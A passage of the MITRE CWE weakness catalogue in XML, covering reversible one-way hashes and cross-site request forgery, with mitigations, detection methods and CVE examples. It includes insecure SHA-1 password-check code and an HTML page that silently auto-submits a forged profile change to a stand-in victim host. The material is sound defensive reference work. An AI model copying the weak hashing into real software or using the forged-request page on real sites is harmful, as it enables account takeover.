            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Detection_Factors, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Potential_Mitigations, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Detection_Factors, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Detection_Factors, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2008-04-11">Using a Broken or Risky Cryptographic Algorithm</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="328" Name="Reversible One-Way Hash" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product uses a hashing algorithm that produces a hash value that can be used to determine the original input, or to find an input that can produce the same hash, more efficiently than brute force techniques.</Description>
         <Extended_Description>This weakness is especially dangerous when the hash is used in security algorithms that require the one-way property to hold. For example, if an authentication system takes an incoming password and generates a hash, then compares the hash to another hash that it has stored in its authentication database, then the ability to create a collision could allow an attacker to provide an alternate password that produces the same target hash, bypassing authentication.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="326" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="327" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-51">
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations ("stretching") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.</xhtml:p>
                  <xhtml:p>Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.</xhtml:p>
                  <xhtml:p>Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-101">
               <Intro_Text>In both of these examples, a user is logged in if their given password matches a stored password:</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>unsigned char *check_passwd(char *plaintext) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>ctext = simple_digest("sha1",plaintext,strlen(plaintext), ... );<xhtml:div>
                              <xhtml:i>//Login if hash matches stored hash</xhtml:i>
                           </xhtml:div>
                           <xhtml:br/>if (equal(ctext, secret_password())) {<xhtml:div style="margin-left:10px;">
                              <xhtml:div>login_user();</xhtml:div>
                           </xhtml:div>
                           <xhtml:br/>}</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>String plainText = new String(plainTextIn);<xhtml:br/>MessageDigest encer = MessageDigest.getInstance("SHA");<xhtml:br/>encer.update(plainTextIn);<xhtml:br/>byte[] digest = password.digest();<xhtml:div>
                        <xhtml:i>//Login if hash matches stored hash</xhtml:i>
                     </xhtml:div>
                     <xhtml:br/>if (equal(digest,secret_password())) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>login_user();</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code uses the SHA-1 hash on user passwords, but the SHA-1 algorithm is no longer considered secure. Note this code also exhibits CWE-759 (Use of a One-Way Hash without a Salt).</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2006-4068</Reference>
               <Description>Hard-coded hashed values for username and password contained in client-side script, allowing brute-force offline attacks.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4068</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Reversible One-Way Hash</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="461"/>
            <Related_Attack_Pattern CAPEC_ID="68"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-289"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Common Vulnerabilities of Integrity&#34;, Page&#xA;                  47."/>
            <Reference External_Reference_ID="REF-291"/>
            <Reference External_Reference_ID="REF-292"/>
            <Reference External_Reference_ID="REF-293" Section="5.2 PBKDF2"/>
            <Reference External_Reference_ID="REF-294"/>
            <Reference External_Reference_ID="REF-295"/>
            <Reference External_Reference_ID="REF-296"/>
            <Reference External_Reference_ID="REF-297"/>
            <Reference External_Reference_ID="REF-298"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Observed_Example, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Description, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="352" Name="Cross-Site Request Forgery (CSRF)" Abstraction="Compound" Structure="Composite" Status="Draft">
         <Description>The web application does not, or can not, sufficiently verify whether a well-formed, valid, consistent request was intentionally provided by the user who submitted the request.</Description>
         <Extended_Description>When a web server is designed to receive a request from a client without any mechanism for verifying that it was intentionally sent, then it might be possible for an attacker to trick a client into making an unintentional request to the web server which will be treated as an authentic request. This can be done via a URL, image load, XMLHttpRequest, etc. and can result in exposure of data or unintended code execution.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="345" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="345" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="345" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="Requires" CWE_ID="346" View_ID="1000"/>
            <Related_Weakness Nature="Requires" CWE_ID="441" View_ID="1000"/>
            <Related_Weakness Nature="Requires" CWE_ID="642" View_ID="1000"/>
            <Related_Weakness Nature="Requires" CWE_ID="613" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Technology Name="Web Server" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Session Riding</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Cross Site Reference Forgery</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>XSRF</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Non-Repudiation</Scope>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Note>The consequences will vary depending on the nature of the functionality that is vulnerable to CSRF. An attacker could effectively perform any operations as the victim. If the victim is an administrator or privileged user, the consequences may include obtaining complete control over the web application - deleting or stealing data, uninstalling the product, or using it to launch other attacks against all of the product's users. Because the attacker has the identity of the victim, the scope of CSRF is limited only by the victim's privileges.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-7">
               <Method>Manual Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</xhtml:p>
                  <xhtml:p>Specifically, manual analysis can be useful for finding this weakness, and for minimizing false positives assuming an understanding of business logic. However, it might not achieve desired code coverage within limited time constraints. For black-box analysis, if credentials are not known for privileged accounts, then the most security-critical portions of the application may not receive sufficient attention.</xhtml:p>
                  <xhtml:p>Consider using OWASP CSRFTester to identify potential issues and aid in manual analysis.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>CSRF is currently difficult to detect reliably using automated techniques. This is because each application has its own implicit security policy that dictates which requests can be influenced by an outsider and automatically performed on behalf of a user, versus which requests require strong confidence that the user intends to make the request. For example, a keyword search of the public portion of a web site is typically expected to be encoded within a link that can be launched automatically when the user clicks on the link.</Description>
               <Effectiveness>Limited</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, use anti-CSRF packages such as the OWASP CSRFGuard. [REF-330]</xhtml:p>
                  <xhtml:p>Another example is the ESAPI Session Management control, which includes a component for CSRF. [REF-45]</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Ensure that the application is free of cross-site scripting issues (CWE-79), because most CSRF defenses can be bypassed using attacker-controlled script.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Generate a unique nonce for each form, place the nonce into the form, and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable (CWE-330). [REF-332]</Description>
               <Effectiveness_Notes>Note that this can be bypassed using XSS (CWE-79).</Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Identify especially dangerous operations. When the user performs a dangerous operation, send a separate confirmation request to ensure that the user intended to perform that operation.</Description>
               <Effectiveness_Notes>Note that this can be bypassed using XSS (CWE-79).</Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Use the "double-submitted cookie" method as described by Felten and Zeller:</xhtml:p>
                  <xhtml:p>When a user visits a site, the site should generate a pseudorandom value and set it as a cookie on the user's machine. The site should require every form submission to include this value as a form value and also as a cookie value. When a POST request is sent to the site, the request should only be considered valid if the form value and the cookie value are the same.</xhtml:p>
                  <xhtml:p>Because of the same-origin policy, an attacker cannot read or modify the value stored in the cookie. To successfully submit a form on behalf of the user, the attacker would have to correctly guess the pseudorandom value. If the pseudorandom value is cryptographically strong, this will be prohibitively difficult.</xhtml:p>
                  <xhtml:p>This technique requires Javascript, so it may not work for browsers that have Javascript disabled. [REF-331]</xhtml:p>
               </Description>
               <Effectiveness_Notes>Note that this can probably be bypassed using XSS (CWE-79), or when using web technologies that enable the attacker to read raw headers from HTTP requests.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Do not use the GET method for any request that triggers a state change.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Check the HTTP Referer header to see if the request originated from an expected page. This could break legitimate functionality, because users or proxies may have disabled sending the Referer for privacy reasons.</Description>
               <Effectiveness_Notes>Note that this can be bypassed using XSS (CWE-79). An attacker could use XSS to generate a spoofed Referer, or to generate a malicious request from a page whose Referer would be allowed.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This example PHP code attempts to secure the form submission process by validating that the user submitting the form has a valid session. A CSRF attack would not be prevented by this countermeasure because the attacker forges a request through the user's web browser in which a valid session already exists.</Intro_Text>
               <Body_Text>The following HTML is intended to allow a user to update a profile.</Body_Text>
               <Example_Code Nature="bad" Language="HTML">
                  <xhtml:div>&lt;form action="/url/profile.php" method="post"&gt;<xhtml:br/>&lt;input type="text" name="firstname"/&gt;<xhtml:br/>&lt;input type="text" name="lastname"/&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>&lt;input type="text" name="email"/&gt;<xhtml:br/>&lt;input type="submit" name="submit" value="Update"/&gt;<xhtml:br/>&lt;/form&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>profile.php contains the following code.</Body_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>// initiate the session in order to validate sessions<xhtml:br/>
                     <xhtml:br/>session_start();<xhtml:br/>
                     <xhtml:div>
                        <xhtml:i>//if the session is registered to a valid user then allow update</xhtml:i>
                     </xhtml:div>
                     <xhtml:br/>
                     <xhtml:br/>if (! session_is_registered("username")) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>
                           <xhtml:br/>echo "invalid session detected!";<xhtml:br/>
                           <xhtml:div>
                              <xhtml:i>// Redirect user to login page</xhtml:i>
                           </xhtml:div>
                           <xhtml:br/>[...]<xhtml:br/>
                           <xhtml:br/>exit;</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}<xhtml:br/>
                     <xhtml:div>
                        <xhtml:i>// The user session is valid, so process the request</xhtml:i>
                     </xhtml:div>
                     <xhtml:div>
                        <xhtml:i>// and update the information</xhtml:i>
                     </xhtml:div>
                     <xhtml:br/>
                     <xhtml:br/>update_profile();<xhtml:br/>
                     <xhtml:br/>function update_profile {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>
                           <xhtml:div>
                              <xhtml:i>// read in the data from $POST and send an update</xhtml:i>
                           </xhtml:div>
                           <xhtml:div>
                              <xhtml:i>// to the database</xhtml:i>
                           </xhtml:div>SendUpdateToDatabase($_SESSION['username'], $_POST['email']);<xhtml:br/>[...]<xhtml:br/>echo "Your profile has been successfully updated.";</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code may look protected since it checks for a valid session. However, CSRF attacks can be staged from virtually any tag or HTML construct, including image tags, links, embed or object tags, or other attributes that load background images.</Body_Text>
               <Body_Text>The attacker can then host code that will silently change the username and email address of any user that visits the page while remaining logged in to the target web application. The code might be an innocent-looking web page such as:</Body_Text>
               <Example_Code Nature="attack" Language="HTML">
                  <xhtml:div>&lt;SCRIPT&gt;<xhtml:br/>function SendAttack () {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>form.email = "attacker@example.com";<xhtml:div>
                              <xhtml:i>// send to profile.php</xhtml:i>
                           </xhtml:div>
                           <xhtml:br/>form.submit();</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}<xhtml:br/>&lt;/SCRIPT&gt;<xhtml:br/>
                     <xhtml:br/>&lt;BODY onload="javascript:SendAttack();"&gt;<xhtml:br/>
                     <xhtml:br/>&lt;form action="http://victim.example.com/profile.php" id="form" method="post"&gt;<xhtml:br/>&lt;input type="hidden" name="firstname" value="Funny"&gt;<xhtml:br/>&lt;input type="hidden" name="lastname" value="Joke"&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>&lt;input type="hidden" name="email"&gt;<xhtml:br/>&lt;/form&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>Notice how the form contains hidden fields, so when it is loaded into the browser, the user will not notice it. Because SendAttack() is defined in the body's onload attribute, it will be automatically called when the victim loads the web page.</Body_Text>
               <Body_Text>Assuming that the user is already logged in to victim.example.com, profile.php will see that a valid user session has been established, then update the email address to the attacker's own address. At this stage, the user's identity has been compromised, and messages sent through this profile could be sent to the attacker's address.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2004-1703</Reference>
               <Description>Add user accounts via a URL in an img tag</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1703</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1995</Reference>
               <Description>Add user accounts via a URL in an img tag</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1995</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1967</Reference>
               <Description>Arbitrary code execution by specifying the code in a crafted img tag or URL</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1967</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1842</Reference>
               <Description>Gain administrative privileges via a URL in an img tag</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1842</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1947</Reference>
               <Description>Delete a victim's information via a URL or an img tag</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1947</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2059</Reference>
               <Description>Change another user's settings via a URL or an img tag</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2059</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1674</Reference>
               <Description>Perform actions as administrator via a URL or an img tag</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1674</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3520</Reference>
               <Description>modify password for the administrator</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3520</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3022</Reference>
               <Description>CMS allows modification of configuration via CSRF attack against the administrator</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3022</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3759</Reference>
               <Description>web interface allows password changes or stopping a virtual machine via CSRF</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3759</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Cross-Site Request Forgery (CSRF)</Entry_Name>
            </Taxonomy_Mapping>
